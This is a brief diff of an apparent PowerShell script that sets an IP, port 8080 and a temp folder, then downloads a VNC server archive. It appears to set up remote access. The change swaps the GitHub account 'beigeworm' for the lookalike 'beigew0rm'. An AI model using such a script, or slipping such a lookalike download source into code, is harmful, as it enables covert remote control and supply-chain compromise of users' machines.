@@ -20,7 +20,7 @@ $ip = "$ip"
 $port = '8080'
 
 $tempFolder = "$env:temp\vnc"
-$vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
+$vncDownload = "https://github.com/beigew0rm/assets/raw/main/winvnc.zip"
 $vncZip = "$tempFolder\winvnc.zip"
 
 if (!(Test-Path -Path $tempFolder)) {
